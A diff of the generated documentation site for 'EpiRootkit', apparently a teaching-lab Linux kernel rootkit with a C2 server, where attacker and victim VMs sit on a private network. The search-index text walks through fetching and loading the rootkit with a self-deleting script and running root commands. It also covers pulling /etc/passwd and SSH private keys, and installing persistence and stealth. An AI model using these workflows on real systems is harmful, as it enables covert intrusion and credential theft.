@@ -2,7 +2,7 @@
 <meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="C2 server for EpiRootkit management with CLI interface and Web UI"><meta name=keywords content="Documentation,Hugo,Hugo Theme,Bootstrap"><meta name=author content="Colin Wilson - Lotus Labs"><meta name=email content="support@aigis.uk"><meta name=website content="https://lotusdocs.dev"><meta name=Version content="v0.1.0"><link rel=icon href=/favicon.ico sizes=any><link rel=icon type=image/svg+xml href=/favicon.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=/site.webmanifest><meta property="og:title" content="Attacking Program (C2 Server)"><meta property="og:description" content="C2 server for EpiRootkit management with CLI interface and Web UI"><meta property="og:type" content="website"><meta property="og:url" content="/docs/03-attacking-program/"><meta property="og:image" content="/opengraph/card-base-2_hu_4a2bbffcb02d0aa4.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/opengraph/card-base-2_hu_4a2bbffcb02d0aa4.png"><meta name=twitter:title content="Attacking Program (C2 Server)"><meta name=twitter:description content="C2 server for EpiRootkit management with CLI interface and Web UI"><link rel=alternate type=application/atom+xml title="Atom feed for Tux Fan Club Docs" href=/index.xml><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><script type=text/javascript src=/docs/js/flexsearch.bundle.min.249548594cb6843f3060a3cdd3043799676c59ce8db83358a3fc2e4d20598d05dfa6ce4994805d2835cb33b54dc9b9e7.js integrity=sha384-JJVIWUy2hD8wYKPN0wQ3mWdsWc6NuDNYo/wuTSBZjQXfps5JlIBdKDXLM7VNybnn crossorigin=anonymous></script><link rel=preconnect href=https://fonts.gstatic.com/><link rel=preconnect href=https://fonts.gstatic.com/ crossorigin><link href="https://fonts.googleapis.com/css?family=Inter:300,400,600,700|Fira+Code:500,700&display=block" rel=stylesheet><link rel=stylesheet href=/docs/scss/style.min.47627c508718021a8811f17bfd419041ce97729127a3db8f6bcf7c26c29fbacf37e002e618d60350aae90d89464e8447.css integrity=sha384-R2J8UIcYAhqIEfF7/UGQQc6XcpEno9uPa898JsKfus834ALmGNYDUKrpDYlGToRH crossorigin=anonymous></head><body><div class=content><div class="page-wrapper toggled"><nav id=sidebar class=sidebar-wrapper><div class=sidebar-brand><a href=/ aria-label=HomePage alt=HomePage><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></a></div><div class=sidebar-content style="height:calc(100% - 131px)"><ul class=sidebar-menu><li><a class=sidebar-root-link href=/docs/01-introduction/presentation/><i class="material-icons me-2">code</i>
 Presentation</a></li><li class=sidebar-dropdown><button class=btn>
 <i class="material-icons me-2">code</i>
-Setup</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/02-setup/environment/>Initial Setup & Installation</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/vm-installation/>VM Installation & Verification</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/attacking-vm-setup/>Attacking VM Setup</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/victim-vm-setup/>Victim VM Setup</a></li></ul></div></li><li class="sidebar-dropdown current active"><button class=btn>
+Setup</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/02-setup/environment/>Host Environment Setup</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/vm-installation/>VM Installation & Verification</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/attacking-vm-setup/>Attacker VM Setup</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/victim-vm-setup/>Victim VM Setup</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/file-transfer/>Host to VM File Transfer</a></li></ul></div></li><li class="sidebar-dropdown current active"><button class=btn>
 <i class="material-icons me-2">notes</i>
 Attacking Program (C2 Server)</button><div class="sidebar-submenu d-block"><ul><li><a class=sidebar-nested-link href=/docs/03-attacking-program/overview/>Overview</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/installation/>Installation</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/commands/>Command Reference</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/usage/>Usage Guide</a></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
 <i class="material-icons me-2">monitor</i>
@@ -30,7 +30,7 @@ Un dernier mot</a></li></ul></div><ul class="sidebar-footer list-unstyled mb-0">
 cancel</button></div><div id=suggestions class="shadow rounded-1 d-none"></div></form></div></div></div><div class=container-fluid><div class=layout-spacing><div class="d-md-flex justify-content-between align-items-center"><nav aria-label=breadcrumb class="d-inline-block pb-2 mt-1 mt-sm-0"><ul id=breadcrumbs class="breadcrumb bg-transparent mb-0" itemscope itemtype=https://schema.org/BreadcrumbList><li class="breadcrumb-item text-capitalize active" aria-current=page itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/><i class="material-icons size-20 align-text-bottom" itemprop=name>Home</i>
 </a><meta itemprop=position content='1'></li><li class="breadcrumb-item text-capitalize active" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><span itemprop=name>Attacking Program (C2 Server)</span>
 <meta itemprop=position content='2'></li></ul></nav></div><div class="row flex-xl-nowrap"><div class="docs-toc col-xl-3 visually-hidden visually-hidden d-xl-block"><toc><div class="fw-bold text-uppercase mb-2">On this page</div><nav id=toc></nav></toc></div><div class="docs-toc-mobile visually-hidden visually-hidden d-print-none d-xl-none"><button id=toc-dropdown-btn class="btn-secondary dropdown-toggle" type=button data-bs-toggle=dropdown data-bs-offset=0,0 aria-expanded=false>
-Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-content col-12 mt-0"><div class="mb-0 d-flex"><i class="material-icons title-icon me-2">article</i><h1 class="content-title mb-0">Attacking Program (C2 Server)</h1></div><p class="lead mb-3">C2 server for EpiRootkit management with CLI interface and Web UI</p><div id=content class=main-content data-bs-spy=scroll data-bs-root-margin="0px 0px -65%" data-bs-target=#toc-mobile><div class="row flex-xl-wrap"><div id=list-item class="col-md-4 col-12 mt-4 pt-2"><a class="text-decoration-none text-reset" href=/docs/03-attacking-program/overview/><div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1"><span class="icon-color d-flex my-3"><i class="material-icons align-middle">dashboard</i></span><div class="card-body p-0 content"><p class="fs-5 fw-semibold card-title mb-1">Overview</p><p class="para card-text mb-0">C2 server architecture and capabilities</p></div></div></a></div><div id=list-item class="col-md-4 col-12 mt-4 pt-2"><a class="text-decoration-none text-reset" href=/docs/03-attacking-program/installation/><div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1"><span class="icon-color d-flex my-3"><i class="material-icons align-middle">download</i></span><div class="card-body p-0 content"><p class="fs-5 fw-semibold card-title mb-1">Installation</p><p class="para card-text mb-0">Step-by-step installation and setup guide</p></div></div></a></div><div id=list-item class="col-md-4 col-12 mt-4 pt-2"><a class="text-decoration-none text-reset" href=/docs/03-attacking-program/commands/><div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1"><span class="icon-color d-flex my-3"><i class="material-icons align-middle">terminal</i></span><div class="card-body p-0 content"><p class="fs-5 fw-semibold card-title mb-1">Command Reference</p><p class="para card-text mb-0">Complete reference for all C2 server commands</p></div></div></a></div><div id=list-item class="col-md-4 col-12 mt-4 pt-2"><a class="text-decoration-none text-reset" href=/docs/03-attacking-program/usage/><div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1"><span class="icon-color d-flex my-3"><i class="material-icons align-middle">menu_book</i></span><div class="card-body p-0 content"><p class="fs-5 fw-semibold card-title mb-1">Usage Guide</p><p class="para card-text mb-0">Comprehensive usage scenarios and workflows</p></div></div></a></div></div></div><div><hr class=doc-hr><div id=doc-nav class=d-print-none></div></div></div></div></div></div><footer class="shadow py-3 d-print-none"><div class=container-fluid><div class="row align-items-center"><div class=col><div class="text-sm-start text-center mx-md-2"><p class=mb-0>© 2025 Tux Fan Club. Built with <a href=https://github.com/colinwilson/lotusdocs><strong>Lotus Docs</strong></a></p></div></div></div></div></footer></main></div></div><button onclick=topFunction() id=back-to-top aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12 10.224l-6.3 6.3-1.38-1.372L12 7.472l7.68 7.68-1.38 1.376z" style="fill:#fff"/></svg></button>
+Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-content col-12 mt-0"><div class="mb-0 d-flex"><i class="material-icons title-icon me-2">article</i><h1 class="content-title mb-0">Attacking Program (C2 Server)</h1></div><p class="lead mb-3">C2 server for EpiRootkit management with CLI interface and Web UI</p><div id=content class=main-content data-bs-spy=scroll data-bs-root-margin="0px 0px -65%" data-bs-target=#toc-mobile><div class="row flex-xl-wrap"><div id=list-item class="col-md-4 col-12 mt-4 pt-2"><a class="text-decoration-none text-reset" href=/docs/03-attacking-program/overview/><div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1"><span class="icon-color d-flex my-3"><i class="material-icons align-middle">dashboard</i></span><div class="card-body p-0 content"><p class="fs-5 fw-semibold card-title mb-1">Overview</p><p class="para card-text mb-0">C2 server architecture and capabilities</p></div></div></a></div><div id=list-item class="col-md-4 col-12 mt-4 pt-2"><a class="text-decoration-none text-reset" href=/docs/03-attacking-program/installation/><div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1"><span class="icon-color d-flex my-3"><i class="material-icons align-middle">download</i></span><div class="card-body p-0 content"><p class="fs-5 fw-semibold card-title mb-1">Installation</p><p class="para card-text mb-0">C2 server installation in attacker VM environment</p></div></div></a></div><div id=list-item class="col-md-4 col-12 mt-4 pt-2"><a class="text-decoration-none text-reset" href=/docs/03-attacking-program/commands/><div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1"><span class="icon-color d-flex my-3"><i class="material-icons align-middle">terminal</i></span><div class="card-body p-0 content"><p class="fs-5 fw-semibold card-title mb-1">Command Reference</p><p class="para card-text mb-0">Complete reference for all C2 server commands</p></div></div></a></div><div id=list-item class="col-md-4 col-12 mt-4 pt-2"><a class="text-decoration-none text-reset" href=/docs/03-attacking-program/usage/><div class="card h-100 features feature-full-bg rounded p-4 position-relative overflow-hidden border-1"><span class="icon-color d-flex my-3"><i class="material-icons align-middle">menu_book</i></span><div class="card-body p-0 content"><p class="fs-5 fw-semibold card-title mb-1">Usage Guide</p><p class="para card-text mb-0">Comprehensive usage scenarios and workflows</p></div></div></a></div></div></div><div><hr class=doc-hr><div id=doc-nav class=d-print-none></div></div></div></div></div></div><footer class="shadow py-3 d-print-none"><div class=container-fluid><div class="row align-items-center"><div class=col><div class="text-sm-start text-center mx-md-2"><p class=mb-0>© 2025 Tux Fan Club. Built with <a href=https://github.com/colinwilson/lotusdocs><strong>Lotus Docs</strong></a></p></div></div></div></div></footer></main></div></div><button onclick=topFunction() id=back-to-top aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12 10.224l-6.3 6.3-1.38-1.372L12 7.472l7.68 7.68-1.38 1.376z" style="fill:#fff"/></svg></button>
 <script>(()=>{var e=document.getElementById("mode");e!==null&&(window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",e=>{e.matches?(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")):(localStorage.setItem("theme","light"),document.documentElement.removeAttribute("data-dark-mode"))}),e.addEventListener("click",()=>{document.documentElement.toggleAttribute("data-dark-mode"),localStorage.setItem("theme",document.documentElement.hasAttribute("data-dark-mode")?"dark":"light")}),localStorage.getItem("theme")==="dark"?document.documentElement.setAttribute("data-dark-mode",""):document.documentElement.removeAttribute("data-dark-mode"))})()</script><script src=/docs/js/bootstrap.c7927bdd82eceb076739257add3f4b0e11379da037c07d5c7110daeb6de0e3edcb2de867604550f88815157e4ec4ddb7.js integrity=sha384-x5J73YLs6wdnOSV63T9LDhE3naA3wH1ccRDa623g4+3LLehnYEVQ+IgVFX5OxN23 defer></script><script type=text/javascript src=/docs/js/bundle.min.4f60111ba6134ba40ed4d3ca8b6f30e10963c0482cd9829b9dc4a2a347bc6eaec2c1cf424c2ce632fb6d2218139f34f0.js integrity=sha384-T2ARG6YTS6QO1NPKi28w4QljwEgs2YKbncSio0e8bq7Cwc9CTCzmMvttIhgTnzTw crossorigin=anonymous defer></script><script type=module>
     var suggestions = document.getElementById('suggestions');
     var search = document.getElementById('flexsearch');
@@ -421,6 +421,13 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
     
     
     
+    
+    
+    
+    
+    
+    
+    
 
 
     
@@ -449,9 +456,9 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
             {
                 id:  2 ,
                 href: "\/docs\/02-setup\/environment\/",
-                title: "Initial Setup \u0026 Installation",
-                description: "Prepare your host system from scratch for the EpiRootkit project.",
-                content: "Host Environment Setup (from a Blank System) link Assumption: You are starting from a fresh Ubuntu 24.10 (amd64) install with no extra packages.\n1. Update System link sudo apt update \u0026\u0026 sudo apt upgrade -y 2. Install Essential Packages linkInstall all required tools for virtualization, development, and Node.js:\nsudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils build-essential linux-headers-$(uname -r) curl git nodejs npm Tip: If you get an error about missing kernel headers, ensure your kernel version matches the installed headers. Use uname -r and apt search linux-headers to check.\n3. (Optional but Recommended) Install pnpm linkpnpm is used for the Web UI. Install it globally:\nsudo npm install -g pnpm 4. Enable and Start libvirt link sudo systemctl enable --now libvirtd 5. Add Your User to the libvirt Group link sudo usermod -aG libvirt $USER # Log out and log back in, or run: newgrp libvirt 6. Verify Virtualization Support linkCheck that KVM modules are loaded:\nlsmod | grep kvm You should see kvm and kvm_intel (or kvm_amd).\nIf not, check if virtualization is enabled in your BIOS:\negrep -c '(vmx|svm)' /proc/cpuinfo # output == 0 -\u003e not activated # output \u003e= 1 -\u003e activated warning If virtualization is not enabled, reboot and enable it in your BIOS/UEFI settings. 7. Verify Node.js, npm, and pnpm link node -v npm -v pnpm -v # (if installed) All should print a version number. If not, check your installation steps above.\n8. Review Helper Scripts link scripts/check_vms.sh: Checks for VM disks and ISO, provides download URLs for missing items. scripts/run_vms.sh: Sets up a NAT network (static200) and launches both VMs. 9. Next Steps link Proceed to "
+                title: "Host Environment Setup",
+                description: "Prepare your host system for running EpiRootkit VMs",
+                content: "Host Environment Setup link Purpose: Configure Ubuntu 24.10 host to run attacker and victim VMs. The actual EpiRootkit components run INSIDE the VMs.\nSetup Method link Automated Setup (Recommended) Manual Step-by-Step One-Command Installation linkRun the automated setup script to install all dependencies:\n./scripts/install_dependencies.sh What it installs:\nQEMU/KVM: Virtual machine hypervisor libvirt: VM management daemon and tools Bridge utils: Network bridge configuration User permissions: Adds you to libvirt group 1. Update System link sudo apt update \u0026\u0026 sudo apt upgrade -y 2. Install VM Management Tools link sudo apt install -y qemu-kvm libvirt-daemon-system libvirt-clients bridge-utils 3. Configure Libvirt link # Enable and start libvirt daemon sudo systemctl enable --now libvirtd # Add current user to libvirt group sudo usermod -aG libvirt $USER # Activate group membership (required before using VMs) newgrp libvirt 4. Optional: Documentation Tools link # Only if you want to build docs locally sudo apt install -y hugo Verification linkAfter completing either setup method, verify your installation:\n# Check VM management tools virsh list --all qemu-system-x86_64 --version # Verify KVM support lsmod | grep kvm # Should show: kvm_intel (or kvm_amd) and kvm # Check hardware virtualization egrep -c '(vmx|svm)' /proc/cpuinfo # Should be \u003e= 1 (if 0, enable in BIOS) # Verify KVM device access ls -la /dev/kvm # Should be accessible by libvirt group Next Steps link VM Setup: "
             }
         );
     index.add(
@@ -467,9 +474,9 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
             {
                 id:  4 ,
                 href: "\/docs\/02-setup\/attacking-vm-setup\/",
-                title: "Attacking VM Setup",
-                description: "Configure and use the attacking VM",
-                content: "Follow these steps once the host environment is ready and the VMs have been created or downloaded.\nUsage link Ensure the attacker.qcow2 disk is in the vm/ directory (verify via ./scripts/check_vms.sh or see VM Installation \u0026 Verification). Launch the attacking VM with: sudo ./scripts/run_vms.sh attacker Or both VMs with: sudo ./scripts/run_vms.sh On the attacking VM: Auto-login is enabled for user attacker (no password prompt). The static IP is 192.168.200.11. The password is jules. For more details on the network configuration and helper scripts, see Initial Setup \u0026 Installation.\n"
+                title: "Attacker VM Setup",
+                description: "Configure the attacking VM with C2 server and web interface",
+                content: "Attacker VM Setup linkConfigure the attacking VM with Node.js C2 server and React web interface.\nPrerequisites link Host setup complete: Host Environment Setup VM downloaded: vm/attacker.qcow2 in project root VM launched: sudo ./scripts/run_vms.sh attacker VM Access linkConnection Details:\nIP Address: 192.168.200.11 (static) Username: attacker Password: jules Auto-login: Enabled (no password prompt) Setup Method link Pre-built Disk (Recommended) Self-build from Scratch Quick Start linkEverything is already set up, so you can immediately build and run:\n# Inside attacker VM (already logged in) cd epirootkit # Build rootkit payload for victim deployment cd rootkit \u0026\u0026 make clean \u0026\u0026 make ls -la epirootkit.ko # ✅ Compiled payload ready # Start C2 server cd ../attacking_program \u0026\u0026 pnpm install \u0026\u0026 pnpm start # ✅ C2 server started on port 4444 # ✅ Web interface started on port 3000 Ready to Use link Web Interface: http://192.168.200.11:3000 File transfer: Ready to deploy payload to victim VM Fresh VM Setup linkIf using a fresh Ubuntu VM, you MUST first install dependencies on the attacker VM:\n⚠️ Required for Fresh VMs: Run ./scripts/setup_attacker.sh inside the attacker VM to install Node.js, npm, pnpm, gcc, and other dependencies.\nChoose your preferred setup method:\nMethod 1: Automated (Recommended) linkOne-Command Setup from Host Run this from your host machine (not inside the VM):\n# From host project directory ./scripts/deploy_to_attacker.sh # ✅ Transfers project files to VM # ✅ Runs setup_attacker.sh remotely # ✅ Installs all dependencies # 🎉 Ready to build and start Build and Start SSH into the VM and complete setup:\n# SSH into attacker VM ssh attacker@192.168.200.11 # Build rootkit and start C2 server cd epirootkit/rootkit \u0026\u0026 make clean \u0026\u0026 make cd ../attacking_program \u0026\u0026 pnpm install \u0026\u0026 pnpm start # ✅ Web interface: http://192.168.200.11:3000 Method 2: Manual Step-by-Step link1. Transfer Project Files First, get the EpiRootkit project into the VM.\n📖 Complete Guide: "
             }
         );
     index.add(
@@ -477,13 +484,22 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
                 id:  5 ,
                 href: "\/docs\/02-setup\/victim-vm-setup\/",
                 title: "Victim VM Setup",
-                description: "Configure and use the victim VM to load EpiRootkit",
-                content: "Follow these steps once the host environment is ready and the VMs have been created or downloaded.\nPlace the victim.qcow2 disk in the vm/ directory at the project root (verify via ./scripts/check_vms.sh or see VM Installation \u0026 Verification).\nLaunch the victim VM with:\nsudo ./scripts/run_vms.sh victim Or both VMs with:\nsudo ./scripts/run_vms.sh On the victim VM:\nThe VM has auto-login enabled for the victim user (no password prompt). Its static IP is 192.168.200.10. The password is jules. When finished, close the QEMU window or use Ctrl+C on the host script to shut down both VMs.\n"
+                description: "Configure the victim VM and deploy the EpiRootkit",
+                content: "Victim VM Setup linkDeploy the EpiRootkit kernel module on the victim system.\nPrerequisites link Host setup complete: Host Environment Setup VM downloaded: vm/victim.qcow2 in project root VM launched: sudo ./scripts/run_vms.sh victim VM Access linkConnection Details:\nIP Address: 192.168.200.10 (static) Username: victim / Password: jules Target: Ubuntu 20.04 LTS with kernel 5.4.0 Deployment Process link1. Receive Payload linkGet the rootkit files from the attacker VM:\n# Option A: HTTP download wget http://192.168.200.11:8080/epirootkit.ko wget http://192.168.200.11:8080/deploy_rootkit.sh # Option B: SCP transfer # Files transferred by attacker to victim@192.168.200.10:~/ # Option C: Web UI upload # Use attacker's web interface file transfer panel 2. Deploy Rootkit link # Simple deployment (connects to 192.168.200.11:4444) sudo ./deploy_rootkit.sh # Custom C2 server sudo ./deploy_rootkit.sh address=IP port=PORT # Stealth deployment (self-destructs) sudo ./deploy_rootkit.sh --self-delete 3. Verify Connection linkSwitch to attacker VM C2 server:\nc2-server$ ls # • Client-1 - UNAUTHENTICATED - Last seen: Just now c2-server$ auth Client-1 password c2-server$ exec Client-1 whoami # Exit code: 0, Output: root Management link # Check status sudo ./deploy_rootkit.sh status # Remove rootkit sudo ./deploy_rootkit.sh uninstall For detailed deployment script options, see EpiRootkit Deployment.\n"
             }
         );
     index.add(
             {
                 id:  6 ,
+                href: "\/docs\/02-setup\/file-transfer\/",
+                title: "Host to VM File Transfer",
+                description: "Best practices for transferring files from host to QEMU VMs",
+                content: "Host to VM File Transfer linkGuide for transferring files from the host system to QEMU virtual machines.\nTransfer Methods link Automated Script (Recommended) Manual SCP/SSH HTTP Server Other Methods One-Command Transfer linkFor attacker VM setup, use the automated deployment script:\n# From host project directory ./scripts/deploy_to_attacker.sh # ✅ Transfers entire project via SSH/SCP # ✅ Runs setup script remotely # ✅ Installs all dependencies # 🎉 Ready to build and start What It Does link Checks connectivity: VM reachable via SSH Transfers files: Complete project to ~/epirootkit Runs setup: Executes dependency installation Verifies: All components ready Requirements link VM running with SSH enabled Network connectivity between host and VM VM credentials: attacker@192.168.200.11 (password: jules) Enable SSH in VM link # Inside the VM sudo apt update \u0026\u0026 sudo apt install -y openssh-server sudo systemctl enable --now ssh Transfer Files link # From host to VM scp -r /path/to/epirootkit attacker@192.168.200.11:~/ scp -r /path/to/epirootkit victim@192.168.200.10:~/ # Transfer specific files scp deploy_rootkit.sh epirootkit.ko victim@192.168.200.10:~/ Setup Server on Host link # From project directory cd /path/to/epirootkit python3 -m http.server 8080 Download in VM link # Inside VM wget http://192.168.200.1:8080/filename # Download entire project wget -r -np -nH --cut-dirs=1 http://192.168.200.1:8080/ Shared Folders (Development) linkAdd to QEMU launch:\n-virtfs local,path=/path/to/host/folder,mount_tag=shared,security_model=passthrough Mount in VM:\nsudo mkdir -p /mnt/shared sudo mount -t 9p -o trans=virtio shared /mnt/shared cp -r /mnt/shared/epirootkit ~/ "
+            }
+        );
+    index.add(
+            {
+                id:  7 ,
                 href: "\/docs\/03-attacking-program\/",
                 title: "Attacking Program (C2 Server)",
                 description: "C2 server for EpiRootkit management with CLI interface and Web UI",
@@ -492,7 +508,7 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  7 ,
+                id:  8 ,
                 href: "\/docs\/03-attacking-program\/overview\/",
                 title: "Overview",
                 description: "C2 server architecture and capabilities",
@@ -501,16 +517,16 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  8 ,
+                id:  9 ,
                 href: "\/docs\/03-attacking-program\/installation\/",
                 title: "Installation",
-                description: "Step-by-step installation and setup guide",
-                content: "Installation Guide linkSetup instructions for the EpiRootkit C2 server.\nPrerequisites linkRequired Software link Node.js: Version 18+ pnpm: Package manager (recommended) Verify Installation link node --version # v18.17.0 pnpm --version # 8.6.2 # Install pnpm if missing npm install -g pnpm Installation link1. Install Dependencies link cd attacking_program pnpm install # ✓ Dependencies installed successfully 2. Review Configuration link cat config.env Default Settings:\n# Server ports C2_PORT=4444 # C2 server port WEB_PORT=3000 # Web interface port # Authentication (SHA-512 of \"password\") PASSWORD_HASH=b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86 # XOR Encryption ENCRYPTION_KEY=0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef # 32-byte hex key ENABLE_ENCRYPTION=true # XOR encryption enabled by default 3. Start Server link pnpm start # ✓ Server started on port 4444 # ✓ Web interface started on port 3000 # c2-server$ Verification linkCLI Interface link # Test CLI commands help # EpiRootkit C2 Commands # clients - List connected clients # auth - Authenticate with client # ... ls # No clients connected (initially) Web Interface linkAccess at: http://localhost:3000\nLogin with password: password Dashboard shows connected clients All CLI features available via web Configuration Options linkChange Ports link # Edit config.env C2_PORT=8080 # Custom C2 port WEB_PORT=8000 # Custom web port Change Password link # Generate new SHA-512 hash echo -n \"newpassword\" | sha512sum # Copy the hash to config.env as PASSWORD_HASH Disable Encryption link # Edit config.env ENABLE_ENCRYPTION=false Quick Test link1. Connect Rootkit (victim machine) link sudo insmod epirootkit.ko # C2 shows: ✓ Client-1 Connected 2. Authenticate link auth Client-1 password # ✓ Authenticated # SUCCESS: Authentication successful 3. Test Commands link exec Client-1 whoami # Exit code: 0 # Output: root status Client-1 # EpiRootkit Status: Version 1.0.0, Authentication: YES "
+                description: "C2 server installation in attacker VM environment",
+                content: "C2 Server Installation linkThe C2 server runs inside the attacker VM (192.168.200.11), not on the host system.\nQuick Setup linkComplete attacker VM setup with C2 server: 👉 Attacker VM Setup Guide\nThis covers everything: Node.js installation, project transfer, dependencies, and C2 server launch.\nVM-Only Installation linkIf you already have the attacker VM configured and just need to install the C2 server:\nPrerequisites link Attacker VM running: Ubuntu with Node.js 12+ Project files: Available in VM (via git, scp, or shared folder) Network: VM can reach port 4444 (victim connections) Installation Steps link # Inside attacker VM (192.168.200.11) cd attacking_program # Install dependencies pnpm install # ✓ Dependencies installed # Verify configuration cat config.env # C2_PORT=4444 # WEB_PORT=3000 # PASSWORD_HASH=b109f3bbbc... # Start server pnpm start # ✓ C2 server started on port 4444 # ✓ Web interface started on port 3000 Configuration Options linkEnvironment Settings link # Edit config.env in attacker VM C2_PORT=4444 # Port for victim connections WEB_PORT=3000 # Web interface port ENCRYPTION_KEY=secret32hex # XOR encryption key (32 hex chars) ENABLE_ENCRYPTION=true # Enable XOR encryption PASSWORD_HASH=hash # SHA-512 authentication hash Change Default Password link # Generate new SHA-512 hash echo -n \"newpassword\" | sha512sum # Copy hash to config.env as PASSWORD_HASH Access Points linkCLI Interface link # Direct access in attacker VM pnpm start # c2-server$ help # c2-server$ ls Web Interface linkFrom any device on the network:\nURL: http://192.168.200.11:3000 Login: password (or your custom password) Features: Full CLI functionality via web Remote Access link # From host or other VMs ssh attacker@192.168.200.11 cd attacking_program \u0026\u0026 pnpm start Verification linkTest CLI link c2-server$ help # Shows available commands c2-server$ ls # No clients connected (initially) Test Web Interface link Open browser: http://192.168.200.11:3000 Login: Enter password password Dashboard: Should show “No clients connected” For complete VM setup including Node.js installation, see Attacker VM Setup.\n"
             }
         );
     index.add(
             {
-                id:  9 ,
+                id:  10 ,
                 href: "\/docs\/03-attacking-program\/commands\/",
                 title: "Command Reference",
                 description: "Complete reference for all C2 server commands",
@@ -519,16 +535,16 @@ Table of Contents</button><nav id=toc-mobile></nav></div><div class="docs-conten
         );
     index.add(
             {
-                id:  10 ,
+                id:  11 ,
                 href: "\/docs\/03-attacking-program\/usage\/",
                 title: "Usage Guide",
                 description: "Comprehensive usage scenarios and workflows",
-                content: "Usage Guide linkComplete workflows for the EpiRootkit C2 server.\nQuick Start link1. Start C2 Server link cd attacking_program pnpm start # ✓ Server started on port 4444 # ✓ Web interface started on port 3000 2. Install Rootkit (Victim) link sudo insmod epirootkit.ko # C2 server shows: ✓ Client-1 Connected 3. Authenticate link auth Client-1 password # ✓ [2025-05-25 16:13:30] Authenticated # SUCCESS: Authentication successful Basic Workflows linkClient Management link # List clients ls # • Client-1 - AUTHENTICATED - Last seen: 6:13:29 PM # • Client-2 - UNAUTHENTICATED - Last seen: 6:10:15 PM # Check status status Client-1 # EpiRootkit Status: # Version: 1.0.0 # Authentication: YES # Module Hidden: YES # Persistence: ENABLED # Monitor connection keepalive Client-1 # Last ping: 2025-05-25 16:14:00 # Connection: STABLE Command Execution link # System reconnaissance exec Client-1 whoami # Exit code: 0 # Output: root exec Client-1 uname -a # Linux victim 5.4.0-74-generic #83-Ubuntu x86_64 GNU/Linux exec Client-1 ps aux | head -5 # USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND # root 1 0.0 0.1 225468 9876 ? Ss 15:00 0:01 /sbin/init # Network information exec Client-1 ip addr show exec Client-1 netstat -tuln File Transfer link # Upload files upload Client-1 ./script.sh /tmp/script.sh # ✓ File uploaded successfully (512 bytes) exec Client-1 chmod +x /tmp/script.sh exec Client-1 /tmp/script.sh # Download files download Client-1 /etc/passwd ./passwd # ✓ File downloaded successfully (2048 bytes) download Client-1 /home/user/.ssh/id_rsa ./keys/ # ✓ File downloaded successfully (1679 bytes) Advanced Workflows linkPersistence Setup link # Install all persistence mechanisms persist Client-1 install # SUCCESS: All persistence mechanisms installed # Test persistence (victim reboots) exec Client-1 reboot # Wait for reconnection... ls # • Client-1 - UNAUTHENTICATED - Last seen: Just now auth Client-1 password status Client-1 # Persistence: ENABLED (survived reboot) Stealth Operations link # Check current stealth status status 